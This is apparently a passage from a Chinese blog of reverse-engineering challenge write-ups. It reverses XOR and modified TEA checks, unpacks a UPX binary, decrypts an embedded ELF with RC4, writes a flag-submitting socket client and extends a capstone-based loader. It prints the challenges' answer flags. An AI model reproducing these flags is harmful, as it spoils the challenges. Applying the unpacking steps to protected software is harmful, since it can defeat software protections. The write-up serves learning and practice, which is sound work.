<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">12</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (key[i])</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            v4 += <span class="number">23</span>;		<span class="comment">//无用</span></span><br><span class="line">            v3 ^= <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            us[i] ^= key[i];	<span class="comment">//不变</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">161</span>:</span><br><span class="line">            us[i] -= <span class="number">2</span> * key[i];		<span class="comment">//减等</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">196</span>:</span><br><span class="line">            us[i] -= <span class="number">10</span>;		<span class="comment">//减等</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">229</span>:</span><br><span class="line">            <span class="comment">//v3 = 8 * ((v4 + 6) &gt;&gt; (v4 &amp; 3));		无用</span></span><br><span class="line">            us[i] = <span class="built_in">inter</span>(us[i]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inter</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a - <span class="number">0x19</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将比较数据经过以上运算得到flag：<strong>SYC{03062639056784}</strong></p>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>ida进去可以发现是加壳了，函数很少；</p>
<p>打开二进制格式搜索upx，果然就找到了老朋友：</p>
<p><img src="https://s2.loli.net/2022/11/01/4qWFzD8ngvBEXOl.png" alt="unpack"></p>
<p>upx加壳的标识码是 UPX! 全大写，拿不准改哪个就全部 Upx 都改成 UPX；</p>
<p>改完就可以脱壳了；</p>
<p>看代码：</p>
<p><img src="https://s2.loli.net/2022/11/01/OoUJV9mjlkSLMs1.png" alt="main"></p>
<p>看不懂子进程作用，反正主要内容在父进程里：输入内容后，先进入change函数，把4个4个的char内容放到4单位的int里；然后把这个int数组放到xor函数里，把每个字节都和j做异或运算，最后和v19比较数据，v19的内容就是cpy的16长度的字符串；</p>
<p>异或的逆运算还是异或，写出复原代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i = i + <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            we[i] = we[i] ^ j;</span><br><span class="line">            we[i + <span class="number">1</span>] = we[i + <span class="number">1</span>] ^ (j + <span class="number">1</span>); </span><br><span class="line">            we[i + <span class="number">2</span>] = we[i + <span class="number">2</span>] ^ (j + <span class="number">2</span>);</span><br><span class="line">            we[i + <span class="number">3</span>] = we[i + <span class="number">3</span>] ^ (j + <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>将逆向得到的cpy字符串带入we得到flag：<strong>SYC{0k_y0u_s0lv3_it_}</strong></p>
<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>这道题缺库不能调，直接看静态；</p>
<p>ida:</p>
<p><img src="https://s2.loli.net/2022/11/01/JosKVDhp8uG6CzZ.png" alt="main"></p>
<p>左图main函数，右图rc4函数，将enter用rc4加密了,密钥是 <code>syclover:)</code>；</p>
<p>使用大厨把enter加密后的内容烤出来：（<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">CyberChef (gchq.github.io)</a>）</p>
<p><img src="https://s2.loli.net/2022/11/01/eG14IYzog8ibysc.png" alt="chef"></p>
<p>发现开头是ELF，说明这加密出来的内容是个elf文件，将其写入二进制文件再用ida打开：</p>
<p><img src="https://s2.loli.net/2022/11/02/AUOTdGoit1JLp3c.png" alt="main"></p>
<p>属于就正常了；</p>
<p><img src="https://s2.loli.net/2022/11/02/JItDwv6UbOjHkKZ.png" alt="func"></p>
<p>如上可知，输入16长度内容，然后进行tea算法(小魔改，每次异或了i)，之后比较数据；</p>
<p>写出逆算法：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>  j = <span class="number">0</span>,l , r ,sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v[<span class="number">4</span>] = &#123; <span class="number">0x6A318EC6</span> , <span class="number">0x5B898EC2</span> , <span class="number">0x42FB5DD1</span> , <span class="number">0x50AC4C5F</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> k[<span class="number">4</span>] = &#123;<span class="number">0x11</span> , <span class="number">0x22</span> , <span class="number">0x33</span> , <span class="number">0x44</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (j &lt; <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">	l = v[j];</span><br><span class="line">	r = v[j+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">		sum += DELTA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">	&#123;</span><br><span class="line">		r -= (k[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ (((l &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * l)) + l) ^ i;</span><br><span class="line">		sum -= DELTA;</span><br><span class="line">		l -= (k[sum &amp; <span class="number">3</span>] + sum) ^ (((r &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * r)) + r) ^ i;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	v[j] = l;</span><br><span class="line">	v[j + <span class="number">1</span>] = r;</span><br><span class="line"></span><br><span class="line">	sum = <span class="number">0</span>;</span><br><span class="line">	j += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* p;</span><br><span class="line">p = (<span class="keyword">char</span> *)v;</span><br><span class="line">p[<span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, p);</span><br></pre></td></tr></table></figure>

<p>得到flag：<strong>SYC{w3f-2hs-ij7-9is}</strong></p>
<h3 id="调试GLIBC-2-34小技巧"><a href="#调试GLIBC-2-34小技巧" class="headerlink" title="调试GLIBC_2.34小技巧"></a>调试GLIBC_2.34小技巧</h3><h4 id="安装glibc-all-in-one"><a href="#安装glibc-all-in-one" class="headerlink" title="安装glibc-all-in-one"></a>安装glibc-all-in-one</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo git clone https://github.com/matrix1001/glibc-all-in-one.git </span><br><span class="line">cd glibc-all-in-one/</span><br><span class="line">sudo python3 update_list</span><br></pre></td></tr></table></figure>

<p>下载glibc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./download 2.35-0ubuntu3_amd64</span><br></pre></td></tr></table></figure>



<h4 id="安装patchelf"><a href="#安装patchelf" class="headerlink" title="安装patchelf"></a>安装patchelf</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh </span><br></pre></td></tr></table></figure>

<p>继续：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>



<h4 id="配置ld-so"><a href="#配置ld-so" class="headerlink" title="配置ld.so"></a>配置ld.so</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter path/to/.so the/elf/you/debug</span><br></pre></td></tr></table></figure>



<h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath path/to/.so the/elf/you/debug</span><br></pre></td></tr></table></figure>



<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><blockquote>
<p>逆向一个CPP服务器，得到flag，并编写socket客户端和远程服务器提交flag;</p>
</blockquote>
<h3 id="逆"><a href="#逆" class="headerlink" title="逆"></a>逆</h3><p>ida查看服务器：</p>
<p><img src="https://s2.loli.net/2022/11/03/TcL4DovPZhJQiCK.png" alt="main"></p>
<p>这是一个服务端框架，首先创建套接字类型文件，并返回fd文件饰描述符；</p>
<p>然后和IP端口进行绑定；</p>
<p>之后一直监听这个端口，直到接收客户端请求，执行处理，并且是多线程的处理；</p>
<p>而处理的主体在 CTask_server 里可以找到：</p>
<p><img src="https://s2.loli.net/2022/11/03/5fXqzLwCBQjFG74.png" alt="true"></p>
<p>先发送 “Please …” (send) 到客户端，然后等待输入，被inside变量接收，之后进入cc加密，和tt生成的v7进行比较数据；</p>
<p>看看里面加密吧，都tea ptsd了，不想放图了；直接来吧：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>  j = <span class="number">0</span>, l, r, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v[<span class="number">3</span>] = &#123; <span class="number">0xED3E9980</span> , <span class="number">0x57284856</span> ,<span class="number">0</span> &#125;;		<span class="comment">//从tt里抄的</span></span><br><span class="line"><span class="keyword">int</span> k[<span class="number">4</span>] = &#123; <span class="number">0x6C</span> , <span class="number">0x30</span> , <span class="number">0x76</span> , <span class="number">0x33</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = v[<span class="number">0</span>];</span><br><span class="line">r = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">	sum += DELTA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; --i)		<span class="comment">//小魔改tea</span></span><br><span class="line">&#123;</span><br><span class="line">	r -= ((l &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) ^ (l + sum) ^ (<span class="number">16</span> * l + k[<span class="number">2</span>]) ^ i;</span><br><span class="line">	l -= ((r &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) ^ (r + sum) ^ (<span class="number">16</span> * r + k[<span class="number">0</span>]) ^ i;</span><br><span class="line">	sum -= DELTA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = l;</span><br><span class="line">v[<span class="number">1</span>] = r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* p = (<span class="keyword">char</span>*)v;</span><br><span class="line">p[<span class="number">9</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, p);</span><br></pre></td></tr></table></figure>

<p>得到flag：<strong>D0Y0uKSk</strong></p>
<h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><p>如同服务端，自己写的客户端也需要一个框架，然后把发送的flag放到主体里就行；</p>
<p>根据题目中的链接，可以知道客户端只需要使用socket创建套接字后通过ip端口连接就行；</p>
<p>那么大概的框架就是： socket() -&gt; 结构地址 -&gt; connect() 连接到地址 -&gt; 读 &amp; 写 -&gt; close() 结束;</p>
<p>内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Client Start\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);               <span class="comment">//逆向得到的参数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> lines[] = <span class="string">&quot;D0Y0uKSk&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span>               <span class="comment">//套接字结构地址</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;serv_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">    serv_addr.sin_family = AF_INET;             <span class="comment">//IPv4</span></span><br><span class="line">    serv_addr.sin_addr.s_addr = inet_addr(<span class="string">&quot;1.14.92.115&quot;</span>);   <span class="comment">//地址</span></span><br><span class="line">    serv_addr.sin_port = htons(<span class="number">1234</span>);           <span class="comment">//端口</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Connecting..\n&quot;</span>);</span><br><span class="line">    connect(fd, (struct sockaddr*)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));   <span class="comment">//接通accept</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done !\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>];       				 	<span class="comment">//回响容器</span></span><br><span class="line">    read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, lines);</span><br><span class="line">    write(fd, lines, <span class="keyword">sizeof</span>(lines) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://s2.loli.net/2022/11/03/BGqOMS58xpjtnrb.png" alt="pass"></p>
<h3 id="更多socket学习"><a href="#更多socket学习" class="headerlink" title="更多socket学习"></a>更多socket学习</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37947204/article/details/80489431">https://blog.csdn.net/m0_37947204/article/details/80489431</a></p>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><blockquote>
<p>给二进制加载器实现更多功能：1、转储节内容 2、输出数据符号 3、使用capstone反汇编.text段；</p>
</blockquote>
<p>称之为环境恶心人之题；</p>
<p>题不难，但在wsl上装环境会变得千奇百怪，反正就是跑不起来，只有vm搞；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo</span><br><span class="line">apt-get install binutils-dev</span><br><span class="line">apt-get install libcapstone-dev</span><br></pre></td></tr></table></figure>

<p>完成这道题需要知晓一点点bfd和capstone，以及更多的模仿；</p>
<p>注意引头 bfd.h 和 capstone/capstone.h；</p>
<p>题目已经把各种各样的代码都实现好了，只要求增添几个功能，逐一实现：</p>
<h3 id="转储节内容"><a href="#转储节内容" class="headerlink" title="转储节内容"></a>转储节内容</h3><p>这里要求命令行输入三个参数，而第三个参数为节名称，并打印节的原始字节；</p>
<p>那么可以在原来打印节的地方（main.cc）镶嵌一个东西进去：</p>
<p><img src="https://s2.loli.net/2022/11/06/FlkOx8SRGnKYqjM.png" alt="one"></p>
<p>flag一开始设置为0，找到同名节后设置为1；</p>
<p>第一个判断是否有三个参数并且调控数为0，则执行这个函数；</p>
<p>外面的判断是如果没有找到第三个参数一样的节名称，则此时flag依然是0，所以执行打印没有找到；</p>
<p>下面是函数具体实现：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_origin_bytes</span><span class="params">(Section* sec, <span class="keyword">char</span> *one)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(sec-&gt;name == one)		<span class="comment">//找到同名则进入</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;contents of %s section\n&quot;</span>, one);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;        &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">16</span> ; i++)		<span class="comment">//打印开头的 00~0f</span></span><br><span class="line">        &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;%02jx &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        i = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;        &quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(j &lt; sec-&gt;size)    <span class="comment">//循环打印</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02jx &quot;</span>, sec-&gt;bytes[j++]);</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">16</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                i = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;        &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;			<span class="comment">//设置flag为1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="输出数据符号"><a href="#输出数据符号" class="headerlink" title="输出数据符号"></a>输出数据符号</h3><p>找到 loader.h 中的symbol类，可以发现 SymbolType 里面只有  SYM_TYPE_UKN SYM_TYPE_FUNC 两个，需要打印 DATA 符号，则添加一个 <code>SYM_TYPE_DATA = 2,</code> ;</p>
<p>之后找到 loader.cc 中的一个函数：load_symbol_bfd，可以发现其中有一步是给函数添加 FUNC项的，镶嵌如下内容：</p>
<p><img src="https://s2.loli.net/2022/11/06/8uVxkC31FnlgLrT.png" alt="two"></p>
<p>当不添加FUNC项的内容时，添加DATA就好了；</p>
<p>最后改变下main.cc里面打印符号的地方为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %-40s 0x%016jx %s\n&quot;</span>,</span><br><span class="line">                   sym-&gt;name.<span class="built_in">c_str</span>(),</span><br><span class="line">                   sym-&gt;addr,</span><br><span class="line">                   (sym-&gt;type &amp; Symbol::SYM_TYPE_FUNC) ? <span class="string">&quot;FUNC&quot;</span> : <span class="string">&quot;DATA&quot;</span>);</span><br></pre></td></tr></table></figure>



<h3 id="使用capstone反汇编-text段"><a href="#使用capstone反汇编-text段" class="headerlink" title="使用capstone反汇编.text段"></a>使用capstone反汇编.text段</h3><p>吐槽一下，edge搜索capstone 反汇编会出现一个博客，详细的记录了如何使用capstone；</p>
<p>具体函数实现：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">disass_text</span><span class="params">(Binary bin)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    csh dis;</span><br><span class="line">    cs_insn *insns;</span><br><span class="line">    Section *text;</span><br><span class="line">    <span class="keyword">size_t</span> n, i;</span><br><span class="line">    Section* sec;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取text节</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; bin.sections.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sec = &amp;bin.sections[i];</span><br><span class="line">        <span class="keyword">if</span>(sec-&gt;name == <span class="string">&quot;.text&quot;</span>)</span><br><span class="line">            text = sec;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!text)   <span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化capstone</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">cs_open</span>(CS_ARCH_X86, CS_MODE_64, &amp;dis) != CS_ERR_OK)</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反汇编把内容放insns里； （ 返回0就是版本问题 （（</span></span><br><span class="line">    n = <span class="built_in">cs_disasm</span>(dis, text-&gt;bytes, text-&gt;size, text-&gt;vma, <span class="number">0</span>, &amp;insns);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打印</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;disassembly of .text section:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016jx\t%s\t\t%s\n&quot;</span>, insns[i].address, insns[i].mnemonic, insns[i].op_str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cs_free</span>(insns,n);</span><br><span class="line">    <span class="built_in">cs_close</span>(&amp;dis);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;err\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

